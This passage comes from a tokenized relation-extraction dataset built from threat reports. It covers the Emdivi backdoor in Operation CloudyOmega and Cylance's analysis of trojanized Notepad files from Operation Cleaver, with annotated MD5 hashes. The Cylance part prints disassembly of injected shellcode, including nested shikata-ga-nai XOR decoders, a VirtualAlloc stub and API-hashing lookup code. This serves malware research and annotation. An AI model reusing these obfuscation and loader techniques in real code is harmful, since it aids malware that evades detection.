"trait", "of", "Type", "S", "is", "that", "it", "uses", "Japanese", "sentences", "that", "seem", "to", "be", "randomly", "taken", "from", "the", "internet", "to", "change", "the", "file", "hash", "."], ["For", "instance", ",", "in", "the", "example", "shown", "in", "Figure", "4", ",", "it", "uses", "a", "sentence", "talking", "about", "the", "special", "theory", "of", "relativity", "."], ["Figure", "4", "."], ["Japanese", "text", "used", "by", "Emdivi", "Type", "S", "variant"], ["Who", "is", "Emdivi", "talking", "to", "?"], ["Once", "infected", ",", "Emdivi", "connects", "to", "hardcoded", "C&C", "servers", "using", "the", "HTTP", "protocol", "."], ["So", "far", ",", "a", "total", "of", "50", "unique", "domains", "have", "been", "identified", "from", "58", "Emdivi", "variants", "."], ["Almost", "all", "websites", "used", "as", "C&C", "servers", "are", "compromised", "Japanese", "websites", "ranging", "from", "sites", "belonging", "to", "small", "businesses", "to", "personal", "blogs", "."], ["We", "discovered", "that", "40", "out", "of", "the", "50", "compromised", "websites", ",", "spread", "across", "13", "IP", "addresses", ",", "are", "hosted", "on", "a", "single", "cloud", "-", "hosting", "service", "based", "in", "Japan", "."], ["Figure", "5", "."], ["Single", "IP", "hosts", "multiple", "compromised", "websites"], ["The", "compromised", "sites", "are", "hosted", "on", "various", "pieces", "of", "web", "server", "software", ",", "such", "as", "Apache", "and", "Microsoft", "Internet", "Information", "Services", "(", "IIS", ")", ",", "and", "are", "on", "different", "website", "platforms", "."], ["This", "indicates", "that", "the", "sites", "were", "not", "compromised", "through", "a", "vulnerability", "in", "a", "single", "software", "product", "or", "website", "platform", "."], ["Instead", ",", "the", "attacker", "somehow", "penetrated", "the", "cloud", "service", "itself", "and", "turned", "the", "websites", "into", "C&C", "servers", "for", "Backdoor", ".", "Emdivi", "."], ["The", "compromised", "cloud", "hosting", "company", "has", "been", "notified", "but", ",", "at", "the", "time", "of", "writing", ",", "has", "not", "replied", "."], ["Symantec", "offers", "two", "IPS", "signatures", "that", "detect", "and", "block", "network", "communication", "between", "infected", "computers", "and", "the", "Emdivi", "C&C", "server", ":", "System", "Infected", ":", "Backdoor", ".", "Emdivi", "Activity", "System", "Infected", ":", "Backdoor", ".", "Emdivi", "Activity", "2"], ["Zero", "-", "day", "and", "links", "to", "other", "cybercriminal", "groups"], ["During", "our", "research", ",", "multiple", "samples", "related", "to", "this", "attack", "campaign", "were", "identified", "and", "allowed", "us", "to", "connect", "the", "dots", ",", "as", "it", "were", ",", "when", "it", "came", "to", "CloudyOmega", "'s", "connections", "to", "other", "attack", "groups", "."], ["In", "August", "2012", ",", "the", "CloudyOmega", "attackers", "exploited", "the", "zero", "-", "day", "Adobe", "Flash", "Player", "and", "AIR", "'", "copyRawDataTo", "(", ")", "'"], ["Integer", "Overflow", "Vulnerability", "(", "CVE-2012", "-", "5054", ")", "in", "an", "attack", "against", "a", "high", "-", "profile", "organization", "in", "Japan", "."], ["The", "attackers", "sent", "a", "Microsoft", "Word", "file", "containing", "a", "maliciously", "crafted", "SWF", "file", "that", "exploited", "the", "vulnerability", "."], ["Once", "successfully", "exploited", ",", "the", "file", "installed", "Backdoor", ".", "Emdivi", "."], ["As", "CVE2012", "-", "5054", "was", "publicly", "disclosed", "in", "the", "same", "month", ",", "the", "attack", "utilized", "what", "was", ",", "at", "the", "time", ",", "a", "zero", "-", "day", "exploit", "."], ["Interestingly", ",", "the", "Flash", "file", "that", "was", "used", "in", "an", "Emdivi", "attack", "in", "2012", "and", "the", "one", "used", "in", "the", "LadyBoyle", "attack", "in", "2013", "look", "very", "similar", "."], ["Figure", "6", "shows", "the", "malformed", "SWF", "file", "executing", "LadyBoyle", "(", ")", "code", "that", "attempts", "to", "exploit", "the", "Adobe", "Flash", "Player", "CVE-2013", "-", "0634", "Remote", "Memory", "Corruption", "Vulnerability", "(", "CVE-2013", "-", "0634", ")", "."], ["The", "Flash", "file", "seems", "to", "have", "been", "created", "using", "the", "same", "framework", "used", "by", "the", "CloudyOmega", "group", ",", "but", "with", "a", "different", "exploit", "."], ["Figure", "6", "."], ["Malformed", "SWF", "file", "used", "in", "the", "LadyBoyle", "campaign", "in", "February", "2013"], ["Both", "attacks", "use", "a", ".doc", "file", "containing", "an", "Adobe", "Flash", "zero", "-", "day", "exploit", "that", "is", "used", "to", "install", "a", "back", "door", "."], ["No", "other", "evidence", "connects", "these", "two", "different", "campaigns", ";", "however", ",", "as", "described", "previously", "in", "Symantec", "Security", "Response", "\u2019s", "Elderwood", "blog", ",", "it", "is", "strongly", "believed", "that", "a", "single", "parent", "organization", "has", "broken", "into", "a", "number", "of", "subgroups", "that", "each", "target", "a", "particular", "industry", "."], ["In", "terms", "of", "the", "latest", "attack", "on", "Ichitaro", ",", "we", "collected", "a", "dozen", "samples", "of", "JTD", "files", ",", "all", "of", "which", "are", "exactly", "the", "same", "except", "for", "their", "payload", "."], ["The", "parent", "organization", ",", "it", "would", "seem", ",", "supplied", "the", "zero", "-", "day", "exploit", "to", "the", "different", "subgroups", "as", "part", "of", "an", "attack", "toolkit", "and", "each", "group", "launched", "a", "separate", "attack", "using", "their", "chosen", "malware", "."], ["This", "is", "why", "three", "different", "payloads", "(", "Backdoor", ".", "Emdivi", ",", "Backdoor", ".", "Korplug", ",", "and", "Backdoor", ".", "ZXshell", ")", "were", "observed", "in", "the", "latest", "zero", "-", "day", "attack", "."], ["Figure", "7", "."], ["Parent", "group", "sharing", "zero", "-", "day", "exploit", "Conclusion", "Operation", "CloudyOmega", "was", "launched", "by", "an", "attack", "group", "that", "has", "communication", "channels", "with", "other", "notorious", "attack", "groups", "including", "Hidden", "Lynx", "and", "the", "group", "responsible", "for", "LadyBoyle", "."], ["CloudyOmega", "has", "been", "in", "operation", "since", "2011", "and", "is", "persistent", "in", "targeting", "Japanese", "organizations", "."], ["With", "the", "latest", "attack", "employing", "a", "zero", "-", "day", "vulnerability", ",", "there", "is", "no", "indication", "that", "the", "group", "will", "stop", "their", "activities", "anytime", "soon", "."], ["Symantec", "Security", "Response", "will", "be", "keeping", "a", "close", "eye", "on", "the", "CloudyOmega", "group", "."], ["Protection", "summary"], ["It", "is", "highly", "recommended", "that", "customers", "using", "Ichitaro", "products", "apply", "any", "patches", "as", "soon", "as", "possible", "."], ["Symantec", "offers", "the", "following", "protection", "against", "attacks", "associated", "with", "Operation", "CloudyOmega", ":", "AV", "Backdoor", ".", "Emdivi", "Backdoor", ".", "Emdivi!gen1"], ["Backdoor", ".", "Emdivi!gen2"], ["Bloodhound", ".", "Exploit.557", "Trojan", ".", "Mdropper", "IPS", "System", "Infected", ":", "Backdoor", "."], ["Emdivi", "Activity", "System", "Infected", ":", "Backdoor", "."], ["Emdivi", "Activity", "2"]]}, {"vertexSet": [[{"name": "Operation Cleaver", "pos": [8, 10], "sent_id": 4, "type": "Campaign"}], [{"name": "Operation Cleaver", "pos": [22, 24], "sent_id": 5, "type": "Campaign"}], [{"name": "83868cdff62829fe3b897e2720204679", "pos": [7, 8], "sent_id": 17, "type": "MD5"}], [{"name": "notepad.exe", "pos": [8, 9], "sent_id": 17, "type": "Malware"}], [{"name": "bfc59f1f442686af73704eff6c0226f0", "pos": [18, 19], "sent_id": 17, "type": "MD5"}], [{"name": "NOTEPAD2.EXE", "pos": [19, 20], "sent_id": 17, "type": "Malware"}], [{"name": "e8ea10d5cde2e8661e9512fb684c4c98", "pos": [28, 29], "sent_id": 17, "type": "MD5"}], [{"name": "Notepad3.exe", "pos": [29, 30], "sent_id": 17, "type": "Malware"}], [{"name": "baa76a571329cdc4d7e98c398d80450c", "pos": [0, 1], "sent_id": 18, "type": "MD5"}], [{"name": "Notepad4.exe", "pos": [0, 1], "sent_id": 19, "type": "Malware"}], [{"name": "19d9b37d3acf3468887a4d41bf70e9aa", "pos": [10, 11], "sent_id": 19, "type": "MD5"}], [{"name": "notepad10.exe", "pos": [11, 12], "sent_id": 19, "type": "Malware"}], [{"name": "d378bffb70923139d6a4f546864aa61c", "pos": [19, 20], "sent_id": 19, "type": "MD5"}], [{"name": "Notepad4.exe", "pos": [5, 6], "sent_id": 48, "type": "Malware"}], [{"name": "Notepad3.exe", "pos": [11, 12], "sent_id": 149, "type": "Malware"}], [{"name": "Notepad4.exe", "pos": [13, 14], "sent_id": 149, "type": "Malware"}], [{"name": "notepad10.exe", "pos": [16, 17], "sent_id": 149, "type": "Malware"}], [{"name": "NOTEPAD2.EXE", "pos": [0, 1], "sent_id": 150, "type": "Malware"}], [{"name": "Cleaver", "pos": [16, 17], "sent_id": 155, "type": "Campaign"}], [{"name": "Cleaver", "pos": [25, 26], "sent_id": 167, "type": "Campaign"}]], "labels": [{"r": "P21", "h": 2, "t": 3, "evidence": [17]}, {"r": "P21", "h": 4, "t": 5, "evidence": [17]}, {"r": "P21", "h": 6, "t": 7, "evidence": [17]}, {"r": "P21", "h": 8, "t": 9, "evidence": [18, 19]}, {"r": "P21", "h": 10, "t": 11, "evidence": [19]}], "title": "201412CylanceOperationCleaver", "sents": [["(", "//www.cylance.com/", ")", "\u00ab", "Back", "to", "Blog(//blog.cylance.com", ")", "Operation", "Cleaver", ":"], ["The", "Notepad", "Files"], ["By", "Derek", "Soeder(//blog.cylance.com", "/", "author", "/", "derek", "-", "soeder", ")", "|", "December", "5", ",", "2014"], ["You", "see", "some", "strange", "stuff", "out", "there", "on", "the", "networks", "where", "attackers", "are", "active", "."], ["Certainly", "the", "stash", "of", "files", "unearthed", "during", "the", "Operation", "Cleaver", "investigation", "included", "much", "of", "the", "bizarre", "and", "something", "of", "the", "terrible", "."], ["Brian", "Wallace", ",", "who", "led", "the", "investigation", ",", "shared", "a", "mysterious", "set", "of", "samples", "with", "me", "awhile", "back", ",", "and", "now", "that", "Operation", "Cleaver", "is", "public", ",", "I", "'ll", "relate", "the", "lurid", "technical", "details", "."], ["The", "Notepad", "Files"], ["The", "files", "in", "question", "were", "found", "in", "a", "dim", "and", "dusty", "directory", "on", "a", "forlorn", "FTP", "server", "in", "the", "US", ",", "commingled", "with", "the", "detritus", "of", "past", "attack", "campaigns", "and", "successful", "compromises", "."], ["They", "were", "at", "once", "familiar", "and", "strange", ",", "and", "they", "were", "made", "still", "stranger", "and", "more", "perplexing", "by", "their", "location", "and", "the", "circumstances", "of", "their", "discovery", "."], ["All", "around", "them", "was", "a", "clutter", "of", "credential", "dumps", ",", "hacking", "utilities", ",", "RATs", ",", "and", "even", "legitimate", "software", "installers", ",", "but", "the", "files", "in", "question", "were", "none", "of", "these", "."], ["They", "were", "Notepad", "."], ["Figure", "1", "."], ["The", "Notepad", "Doppelg\u00e4ngers", "."], ["Of", "course", ",", "a", "purloined", "Notepad", "icon", "in", "malware", "is", "nothing", "new", ",", "but", "something", "different", "was", "going", "on", "here", "."], ["Within", "each", "of", "the", "two", "families", ",", "all", "of", "the", "samples", "had", "the", "same", "main", "icon", ",", "file", "size", ",", "and", "version", "information", ",", "yet", "each", "one", "had", "a", "distinct", "hash", "."], ["At", "the", "time", ",", "only", "one", "of", "those", "five", "hashes", "existed", "on", "the", "internet", ":", "the", "official", "32", "-", "bit", "Simplified", "Chinese", "Notepad", "from", "Windows", "XP", "x64", "/", "Windows", "Server", "2003", "."], ["Suspecting", "that", "the", "remaining", "Notepads", "were", "derivatives", "of", "official", "Windows", "files", ",", "we", "associated", "the", "other", "member", "of", "the", "first", "family", "with", "the", "confirmed", "legitimate", "Notepad", ",", "and", "we", "matched", "the", "second", "family", "with", "the", "32", "-", "bit", "US", "English", "Notepad", "from", "Windows", "7", "(", "not", "present", "in", "the", "original", "set", ")", "."], ["MD5", "File", "Name", "File", "Size", "File", "Version", "83868cdff62829fe3b897e2720204679", "notepad.exe", "66,048", "5.2.3790.3959", ",", "Chinese", "(", "Simplified", ",", "PRC", ")", "bfc59f1f442686af73704eff6c0226f0", "NOTEPAD2.EXE", "179,712", "6.1.7600.16385", ",", "English", "(", "United", "States", ")", "e8ea10d5cde2e8661e9512fb684c4c98", "Notepad3.exe", "179,712", "6.1.7600.16385", ",", "English", "(", "United", "States", ")"], ["baa76a571329cdc4d7e98c398d80450c"], ["Notepad4.exe", "66,048", "5.2.3790.3959", ",", "Chinese", "(", "Simplified", ",", "PRC", ")", "19d9b37d3acf3468887a4d41bf70e9aa", "notepad10.exe", "179,712", "6.1.7600.16385", ",", "English", "(", "United", "States", "d378bffb70923139d6a4f546864aa61c", "--", "179,712", "6.1.7600.16385", ",", "English", "(", "United", "States", ")", "Table", "1", "."], ["A", "summary", "of", "Notepad", "samples", "dug", "from", "the", "attackers", "'", "FTP", "drop", ",", "with", "the", "official", "Windows", "7", "Notepad", "appearing", "at", "bottom", "."], ["It", "and", "the", "official", "Windows", "XP/2003", "Notepad", "are", "represented", "in", "green", "."], ["Things", "got", "interesting", "when", "we", "started", "comparing", "the", "Notepads", "at", "the", "byte", "level", "."], ["The", "image", "below", "depicts", "some", "byte", "differences", "between", "the", "original", "Windows", "7", "Notepad", "and", "samples", "NOTEPAD2.EXE", "and", "Notepad3.exe", ":", "Figure", "2", "."], ["Comparison", "of", "the", "Windows", "7", "Notepad", "(", "green", "channel", ")", ",", "NOTEPAD2.EXE", "(", "red", "channel", ")", ",", "and", "Notepad3.exe", "(", "blue", "channel", ")", "."], ["At", "the", "Portable", "Executable", "(", "PE", ")", "level", ",", "these", "differences", "translate", "to", "changes", "in", "the", "files", "'", "timestamps", "(", "IMAGE_NT_HEADERS.FileHeader", "."], ["TimeDateStamp", ",", "offset", "0xE8", "in", "the", "figure", "above", ")", ",", "the", "relative", "virtual", "addresses", "(", "RVAs", ")", "of", "their", "entry", "points", "(", "IMAGE_NT_HEADERS.OptionalHeader", "."], ["AddressOfEntryPoint", ",", "offset", "0x108", ")", ",", "and", "their", "checksums", "(", "IMAGE_NT_HEADERS.OptionalHeader", "."], ["CheckSum", ",", "offset", "0x138", ")", "."], ["The", "timestamps", "were", "rolled", "back", "by", "weeks", "to", "months", "relative", "to", "the", "legitimate", "progenitors", "'", "timestamps", ";", "we", "do", "n't", "know", "why", "."], ["The", "entry", "points", "retreated", "or", "advanced", "by", "hundreds", "of", "bytes", "to", "dozens", "of", "kilobytes", ",", "for", "reasons", "we", "'ll", "explore", "shortly", "."], ["And", "the", "checksums", "were", "all", "zeroed", "out", ",", "presumably", "because", "the", "file", "modifications", "invalidate", "them", ",", "invalid", "non", "-", "zero", "checksums", "are", "a", "tip", "-", "off", ",", "and", "zeroing", "is", "easier", "than", "recomputing", "."], ["So", "what", "'s", "the", "story", "with", "all", "those", "other", "modifications", "?"], ["In", "all", "cases", "they", "seem", "to", "be", "confined", "to", "the", "\"", ".text", "\"", "section", ",", "centrally", "located", "to", "avoid", "the", "import", "directory", ",", "debug", "directory", ",", "load", "configuration", "directory", ",", "and", "import", "address", "table", "."], ["This", "makes", "sense", "as", "a", "general", "precaution", ",", "considering", "that", "corrupting", "the", "import", "directory", "would", "unhelpfully", "crash", "the", "Windows", "loader", "during", "process", "initialization", "."], ["The", "following", "image", "illustrates", "the", "distribution", "of", "modifications", "relative", "to", "these", "structures", "."], ["Figure", "3", "."], ["File", "locations", "of", "modifications", "(", "red", ")", "and", "the", "PE", "structures", "they", "avoid", "(", "gray", ")", "."], ["From", "left", "to", "right", ",", "the", "four", "vertical", "bars", "represent", "the", "\"", ".text", "\"", "sections", "of", "NOTEPAD2.EXE", ",", "Notepad3.exe", ",", "Notepad4.exe", ",", "and", "notepad10.exe", ",", "as", "compared", "to", "the", "original", "Notepad", "from", "their", "respective", "families", "."], ["The", "Import", "Address", "Table", "(", "IAT", ")", ",", "original", "entry", "point", "(", "OEP", ",", "green", ")", ",", "malware", "entry", "point", "(", "EP", ",", "yellow", ")", ",", "load", "configuration", "directory", "(", "LC", ")", ",", "import", "directory", "(", "Imp", ")", ",", "and", "debug", "directory", "(", "Dbg", ")", "are", "labeled", "."], ["While", "the", "arrangement", "of", "the", "structures", "varies", "among", "families", ",", "it", "'s", "clear", "from", "the", "figure", "above", "that", "the", "region", "between", "structures", "containing", "the", "original", "entry", "point", "has", "in", "each", "case", "been", "filled", "with", "modifications", "."], ["Notably", ",", "each", "sample", "has", "a", "short", "run", "of", "consecutive", "modifications", "immediately", "following", "the", "new", "entry", "point", ",", "and", "then", "a", "longer", "run", "elsewhere", "in", "the", "region", "."], ["Presumably", ",", "both", "runs", "are", "injected", "malicious", "code", ",", "and", "the", "other", "modifications", "may", "well", "be", "random", "noise", "intended", "as", "a", "distraction", "."], ["Since", "there", "are", "no", "other", "changes", "and", "no", "appended", "data", ",", "it", "'s", "reasonable", "to", "assume", "that", "the", "code", "that", "makes", "a", "Notepad", "act", "like", "Notepad", "is", "simply", "gone", ",", "and", "that", "the", "samples", "will", "behave", "only", "maliciously", "."], ["If", "true", ",", "then", "these", "modifications", "would", "represent", "a", "backdooring", "or", "\"", "Trojanization", "\"", "rather", "than", "a", "parasitic", "infection", ",", "and", "this", "distinction", "implies", "certain", "things", "about", "how", "the", "Notepads", "were", "made", "and", "how", "they", "might", "be", "used", "."], ["Tales", "from", "the", "Code"], ["Let", "'s", "take", "a", "look", "at", "the", "entry", "point", "code", "of", "the", "malicious", "Notepads", "and", "see", "if", "it", "aligns", "with", "our", "observations", "."], ["The", "short", "answer", "is", ",", "it", "looks", "like", "nonsense", "."], ["Here", "'s", "a", "snippet", "from", "Notepad4.exe", ":", "010067E3", "010067E8", "010067EA", "010067F0", "010067F2", "010067F7", "010067F9", "010067FB"], ["010067FC", "010067FE", "010067FF"], ["sbb", "eax", ",", "2C7AE239", "test", "al", ",", "80", "test", "eax", ",", "498DBAD5"], ["jle", "short", "01006831", "sub", "eax", ",", "B69F4A73", "or", "edx", ",", "esi", "jnz", "short", "01006800"], ["inc", "ebx", "mov", "cl", ",", "91", "cwde", "jnp", "short", "01006803"], ["At", "this", "point", "the", "code", "becomes", "difficult", "to", "list", "due", "to", "instruction", "scission", ",", "or", "branching", "into", "the", "middle", "of", "an", "instruction", "(", "analogous", "to", "a", "frameshift", "error", "in", "DNA", "translation", ",", "if", "that", "helps", ")", "."], ["For", "instance", ",", "the", "JNP", "instruction", "at", "010067FF", "is", "a", "two", "-", "byte", "instruction", ",", "and", "the", "JNZ", "branch", "at", "010067F9", ",", "if", "satisfied", ",", "jumps", "to", "the", "JNP", "instruction", "'s", "second", "byte", "at", "01006800", "."], ["That", "byte", "begins", "a", "different", "two", "-", "byte", "instruction", ",", "which", "incorporates", "what", "would", "have", "otherwise", "been", "the", "first", "byte", "of", "the", "instruction", "after", "the", "JNP", ",", "meaning", "its", "successor", "will", "start", "in", "the", "middle", "of", "JNP", "'s", "successor", ",", "and", "so", "on", "."], ["The", "two", "execution", "paths", "usually", "(", "but", "do", "n't", "necessarily", ")", "converge", "after", "a", "few", "instructions", "."], ["The", "outcome", "of", "these", "instructions", "depends", "on", "the", "initial", "state", "of", "the", "registers", ",", "which", "is", "technically", "undefined", "."], ["Seeing", "code", "operate", "on", "undefined", "values", "typically", "suggests", "that", "the", "bytes", "are", "n't", "code", "after", "all", "and", "so", "should", "n't", "have", "been", "disassembled", "."], ["But", "keep", "looking", "."], ["Notice", "that", "there", "are", "no", "memory", "accesses", "(", "which", "could", "raise", "an", "access", "violation", ")", ",", "no", "stack", "pointer", "manipulation", "(", "which", "could", "cause", "a", "stack", "overflow", "or", "underflow", ")", ",", "no", "division", "instructions", "(", "which", "could", "raise", "a", "divide", "exception", ")", ",", "no", "invalid", "or", "privileged", "instructions", ",", "no", "interrupts", "or", "indirect", "branches", "--", "really", ",", "no", "uncontrolled", "execution", "transfers", "of", "any", "kind", "."], ["Even", "more", "tellingly", ",", "all", "the", "possible", "execution", "paths", "seem", "to", "eventually", "flow", "to", "this", "code", ":", "01006877", "01006879", "0100687E"], ["0100687F", "01006881", "01006882", "01006883", "01006884", "01006885", "01006886", "01006887", "01006888", "01006889", "0100688E", "0100688F", "01006891", "mov", "ch", ",", "15", "cmp", "eax", ",", "4941B62F", "xchg", "eax", ",", "ebx", "mov", "cl", ","], ["4B", "stc", "wait", "xchg", "eax", ",", "ecx", "inc", "ebx", "cld"], ["db", "67", "aaa", "cwde", "sub", "eax", ",", "24401D66", "dec", "eax", "add", "al", ",", "F8", "jmp", "01005747", "01005747", "01005748", "nop", "jmp", "01005758", "01005758"], ["01005759"], ["0100575A", "cld", "nop", "jmp", "short", "01005768", "01005768", "call", "01005A70", "01005A70", "01005A71"], ["nop", "pop", "ebp", "01005A72"], ["01005A85", "jmp", "nop", "01005A85", "01005A86", "mov", "01005A99"], ["01005A9B", "push", "00000040", "push", "00001000", "01005A8B", "01005AA0", "01005AA1", "01005AAF", "01005AB0", "01005AB1"], ["esi", ",", "000001A9", "jmp", "nop", "jmp", "01005A99", "01005AAF"], ["push", "esi", "nop", "jmp", "01005AC2", "01005AC2", "01005AC4"], ["push", "0", "push", "E553A458", "01005AD7", "call", "ebp", "01005AC9", "jmp", "01005AD7"], ["Here", "the", "gaps", "in", "the", "listing", "indicate", "when", "the", "disassembly", "follows", "an", "unconditional", "branch", "."], ["The", "code", "seems", "to", "abruptly", "change", "character", "after", "the", "jump", "at", "01006891", ",", "transitioning", "from", "gibberish", "to", "a", "string", "of", "short", "sequences", "connected", "by", "unconditional", "branches", "."], ["This", "transition", "corresponds", "to", "a", "jump", "from", "the", "end", "of", "the", "short", "run", "of", "modifications", "(", "01006896", ")", "after", "the", "malware", "entry", "point", "to", "the", "beginning", "of", "the", "longer", "run", "of", "modifications", "(", "01005747", ")", "a", "few", "kilobytes", "before", "it", "."], ["(", "See", "the", "third", "column", "in", "Figure", "3", ".", ")"], ["In", "the", "disassembly", "above", ",", "the", "first", "sequence", "of", "green", "lines", "is", "a", "clear", "CALL", "-", "POP", "pair", "intended", "to", "obtain", "a", "code", "address", "in", "a", "position", "-", "independent", "way", "."], ["(", "An", "immediate", "address", "value", "marked", "with", "a", "relocation", "would", "be", "the", "orthodox", "way", "to", "obtain", "a", "code", "pointer", ",", "but", "preparing", "that", "would", "have", "involved", "modifying", "the", "\"", ".reloc", "\"", "section", ".", ")"], ["No", "way", "is", "this", "construct", "a", "coincidence", "."], ["Furthermore", ",", "the", "blue", "lines", "strongly", "resemble", "the", "setup", "for", "a", "VirtualAlloc", "call", "(", "VirtualAlloc(NULL", ",", "0x1A9", ",", "MEM_COMMIT", ",", "PAGE_EXECUTE_READWRITE", ")", ")", "typical", "of", "a", "deobfuscation", "stub", ",", "and", "the", "second", "set", "of", "green", "lines", "invoke", "the", "CALL", "-", "POPped", "function", "pointer", "with", "what", "one", "might", "readily", "assume", "is", "a", "hash", "of", "the", "string", "\"", "VirtualAlloc", "\"", "."], ["(", "It", "is", ".", ")"], ["There", "'s", "plenty", "more", "to", "observe", "in", "the", "disassembly", ",", "but", ",", "let", "'s", "fast", "-", "forward", "past", "it", "."], ["windbg", "-c", "\"", "bp", "kernel32!VirtualAlloc", ";", "g", "\"", "Notepad4.exe", "...", "Figure", "4", "."], ["VirtualAlloc", "breakpoint", "hit", "."], ["The", "parameters", "on", "the", "stack", "and", "the", "state", "of", "the", "registers", "are", "as", "expected", "."], ["g", "poi(@esp", ")"], [";", "ba", "w", "1", "@eax+@esi-1", ";", "g", "...", "Figure", "5", "."], ["Memory", "write", "(", "hardware", ")", "breakpoint", "hit", "after", "the", "last", "(", "0x1A9th", ")", "byte", "is", "written", "to", "allocated", "memory", "."], ["And", "now", "we", "can", "dump", "the", "extracted", "code", "from", "memory", "."], ["It", "is", "n't", "immediately", "gratifying", ":", "00100000", "00100002", "00100007"], ["0010000B", "0010000C"], ["0010000E", "00100010", "00100013", "00100016", "00100019", "fabs", "mov", "edx", ",", "4DF05534", ";", "=", "initial", "XOR", "key", "fnstenv", "[", "esp-0C", "]", ";", "old", "trick", "to", "get", "EIP", "pop", "eax", "sub", "ecx", ",", "ecx", "mov", "cl", ",", "64", ";"], ["=", "length", "in", "DWORDs", "xor", "[", "eax+19", "]", ",", "edx", "add", "edx", ",", "[", "eax+19", "]", ";", "XOR", "key", "is", "modified", "after", "each", "DWORD", "add", "eax", ","], ["4", "db", "D6", "The", "byte", "0xD6", "at", "address", "00100019", "does", "n't", "disassemble", ",", "and", "there", "are", "n't", "any", "branches", "skipping", "over", "it", "."], ["But", "check", "out", "the", "instructions", "just", "above", "it", "referencing", "\"", "[", "eax+19", "]", "\"", "."], ["The", "code", "is", "in", "a", "sense", "self", "-", "modifying", ",", "flowing", "right", "into", "a", "portion", "of", "itself", "that", "it", "XOR", "decodes", "."], ["The", "first", "decoded", "instruction", "is", "\"", "LOOP", "00100010", "\""], ["(", "0xD6", "^", "0x34", "="], ["0xE2", ",", "the", "opcode", "for", "LOOP", ")", ",", "which", "will", "execute", "the", "XOR", "loop", "body", "99", "more", "times", "(", "CL", "-", "1", "=", "0x63", "=", "99", ")", "and", "then", "fall", "through", "to", "the", "newly", "-", "decoded", "code", "."], ["When", "we", "run", "this", "decoding", "stub", "(", "which", ",", "come", "to", "find", "out", ",", "is", "Metasploit", "'s", "\"", "shikata", "ga", "nai", "\"", "decoder", "stub", ")", "to", "completion", ",", "we", "'re", "rewarded", "with", "...", "another", "decoding", "stub", ":", "0010001B", "0010001D"], ["00100021", "00100026", "00100027", "00100029", "0010002B", "fcmovu", "st", ",", "st(1", ")", ";", "a", "different", "initial", "FPU", "instruction", "from", "above", "fnstenv", "[", "esp-0C", "]", ";", "different", "ordering", "of", "independent", "instructions", "mov", "ebx", ",", "C2208861", ";", "a", "different", "initial", "XOR", "key", "and", "register", "pop", "ebp", ";", "a", "different", "code", "pointer", "register"], ["xor", "ecx", ",", "ecx", ";", "XOR", "as", "an", "alternative", "to", "SUB", "for", "zeroing", "counter", "mov", "cl", ",", "5D", ";", "a", "shorter", "length", "xor", "[", "ebp+1A", "]", ",", "ebx", ";", "decoding", "starts", "at", "a", "different", "offset", "0010002E", "add", "ebx", ",", "[", "ebp+1A", "]", "0010002E"], ["00100031", "00100034", "add", "ebx", ",", "[", "ebp+1A", "]", "sub", "ebp", ",", "FFFFFFFC", ";", "SUB", "-4", "as", "an", "alternative", "to", "ADD", "+4", "loop", "000FFFCA", ";", "instruction", "is", "partly", "encoded"], ["Here", ",", "the", "first", "byte", "to", "be", "XORed", "is", "the", "second", "byte", "of", "the", "LOOP", "instruction", ",", "hence", "the", "nonsensical", "destination", "apparent", "in", "the", "pre", "-", "decoding", "disassembly", "above", "."], ["(", "For", "brevity", ",", "we", "cut", "each", "listing", "at", "the", "first", "sign", "of", "encoding", ".", ")"], ["Run", "that", "to", "completion", ",", "and", "then", "...", "00100036"], ["0010003B", "0010003D", "00100041", "00100042", "00100044", "00100046", "00100049"], ["0010004C", "mov", "edx", ",", "463DC74D", "fcmovnbe", "st", ",", "st(0", ")", "fnstenv"], ["[", "esp-0C", "]", "pop", "eax", "sub", "ecx", ",", "ecx", "mov", "cl", ",", "57", ";", "notice", "the", "length", "gets", "shorter", "each", "time"], ["xor", "[", "eax+12", "]", ",", "edx", "add", "eax", ",", "4", "add", "ebx", ",", "ds:[47B3DFC9", "]", ";", "instruction", "is", "partly", "encoded"], ["And", "then", "...", "00100051", "00100053", "00100058", "0010005c"], ["0010005d", "0010005f", "00100061", "00100064", "00100067", "fcmovbe", "st", ",", "st(0", ")", "mov", "edx", ",", "869A5D73", "fnstenv"], ["[", "esp-0C", "]", "pop", "eax", "sub", "ecx", ",", "ecx", "mov", "cl", ",", "50"], ["xor", "[", "eax+18],edx", "add", "eax", ",", "4", "add", "edx", ",", "[", "eax+67", "]", ";", "instruction", "is", "partly", "encoded"], ["And", "then", "...", "0010006C", "00100071", "00100073"], ["00100077", "00100078", "mov", "eax", ",", "E878CF4D", "fcmovnbe", "st", ",", "st(4", ")", "fnstenv", "[", "esp-0C", "]", "pop", "ebx", "sub", "ecx", ",", "ecx", "0010007A", "mov", "cl", ",", "49", "0010007A"], ["0010007C", "0010007F", "00100082", "00100085", "mov", "cl", ",", "49"], ["xor", "[", "ebx+14", "]", ",", "eax", "add", "ebx", ",", "4", "add", "eax", ",", "[", "ebx+10", "]", "scasd", ";", "incorrect", "disassembly", "of", "encoded", "byte", "Finally", ",", "at", "the", "end", "of", "six", "nested", "decoders", ",", "we", "see", "the", "light", ":", "00100087"], ["00100088"], ["0010008D", "0010008E", "00100090", "00100092"], ["00100096", "00100099", "0010009C", "0010009F"], ["001000A3", "001000A5"], ["001000A7", "001000A8", "001000AA"], ["001000AC", "001000AE", "001000B1", "..."], ["cld", "call", "00100116", "pushad", "mov", "ebp", ",", "esp", "xor", "edx", ",", "edx", "mov", "edx", ",", "fs:[edx+30", "]", ";", "PTEB->ProcessEnvironmentBlock", "mov", "edx", ",", "[", "edx+0C", "]", ";", "PPEB->Ldr", "mov", "edx", ",", "[", "edx+14", "]", ";", "PPEB_LDR_DATA->InMemoryOrderModuleList", "mov", "esi", ",", "[", "edx+28", "]", ";", "PLDR_MODULE.BaseDllName", "."], ["Buffer", "movzx", "ecx", ",", "word", "ptr", "[", "edx+26", "]", ";", "PLDR_MODULE.BaseDllName", "."], ["MaximumLength", "xor", "edi", ",", "edi"], ["xor", "eax", ",", "eax", "lodsb", "cmp", "al", ",", "61", ";", "check", "for", "lowercase", "letter", "jl", "001000ae"], ["sub", "al", ",", "20", ";", "convert", "to", "uppercase", "ror", "edi", ",", "0D", "add", "edi", ",", "eax"], ["It", "looks", "like", "a", "call", "over", "a", "typical", "module", "or", "export", "lookup", "function", "."], ["In", "fact", ",", "it", "is", ",", "and", "as", "the", "RORADD", "pair", "suggests", ",", "it", "implements", "module", "name", "and", "export", "name", "hashing", ",", "the", "algorithms", "of", "which", "can", "be", "expressed", "as", "follows", ":", "unsigned", "int", "GetModuleNameHash(PLDR_MODULE", "pLdrModule", ")"], ["{", "unsigned", "int", "hash", "=", "0", 